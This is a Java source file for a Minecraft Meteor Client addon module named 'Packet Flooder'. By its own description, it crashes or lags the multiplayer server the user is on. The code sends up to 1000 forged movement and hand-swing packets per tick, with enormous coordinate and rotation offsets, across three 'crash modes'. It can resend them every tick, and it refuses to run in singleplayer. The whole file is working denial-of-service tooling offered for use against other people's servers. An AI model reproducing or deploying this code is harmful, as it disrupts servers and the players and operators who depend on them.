package com.crystaldevs.crystal.modules.crash;

import com.crystaldevs.crystal.CrystalAddon;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.Utils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.util.Hand;

import java.util.Objects;

public class PacketFlooder extends Module {
    private final Setting<Modes> crashMode;

    private final Setting<Integer> amount;

    private final Setting<Boolean> onGround;

    private final Setting<Boolean> autoDisable;
    private final Setting<Boolean> onTick;

    public PacketFlooder() {
        super(CrystalAddon.CRYSTAL_CRASH_CATEGORY.get(), "Packet Flooder", "CRYSTAL || Attempts to crash / lag the server you are on by flooding it with packets.");

        SettingGroup sgGeneral = settings.getDefaultGroup();

        onGround = sgGeneral.add(new BoolSetting.Builder()
            .name("onGround")
            .description("Choose to for the packets to send onGround or not.")
            .defaultValue(true)
            .build());

        autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("Auto Disable")
            .description("Disables module on kick.")
            .defaultValue(true)
            .build());

        onTick = sgGeneral.add(new BoolSetting.Builder()
            .name("on-tick")
            .description("Sends the packets every tick.")
            .defaultValue(false)
            .build());

        amount = sgGeneral.add(new IntSetting.Builder()
            .name("amount")
            .description("How many packets to send to the server per tick.")
            .defaultValue(100)
            .min(1)
            .sliderMax(1000)
            .build());

        crashMode = sgGeneral.add(new EnumSetting.Builder<Modes>()
            .name("mode")
            .description("Which crash mode to use.")
            .defaultValue(Modes.NEW)
            .build());
    }

    @Override
    public void onActivate() {
        if (!mc.isInSingleplayer()) {
            if (Utils.canUpdate() && !onTick.get()) {
                sendPackets();
            } else if (!onTick.get()) {
                error("Cannot send packets at the moment.");
            }
        } else {
            error("You must be on a server, toggling.");
            toggle();
        }
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (!mc.isInSingleplayer() && onTick.get()) {
            sendPackets();
        }
    }

    private void sendPackets() {
        int bound = amount.get();
        int i = 0;

        while (i < bound) {
            if (mc.getNetworkHandler() != null) {
                switch (crashMode.get()) {
                    case OLD -> {
                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.OnGroundOnly(Math.random() >= 0.5));
                        mc.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
                    }
                    case NEW -> {
                        double offset = 85523 * i;
                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                            mc.player.getX() + offset,
                            mc.player.getY() + offset,
                            mc.player.getZ() + offset,
                            Math.random() >= 0.5));
                        mc.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
                    }
                    case EFFICIENT -> {
                        double offset = 85523 * i;
                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                            mc.player.getX() + offset,
                            mc.player.getY() + offset,
                            mc.player.getZ() + offset,
                            onGround.get()));
                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.Full(
                            mc.player.getX() + offset,
                            mc.player.getY() + offset,
                            mc.player.getZ() + offset,
                                (float) (mc.player.getYaw() + offset),
                                (float) (mc.player.getPitch() + offset),
                            onGround.get()));
                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.LookAndOnGround(
                                (float) (mc.player.getYaw() + offset),
                                (float) (mc.player.getPitch() + offset),
                            onGround.get()));
                        mc.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
                    }
                }
                i++;
            } else {
                break;
            }
        }

        if (autoDisable.get()) {
            toggle();
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (!autoDisable.get()) {
            return;
        }
        toggle();
    }

    public enum Modes {
        NEW,
        OLD,
        EFFICIENT,
    }

    public enum TickEventModes {
        Pre,
        Post
    }
}
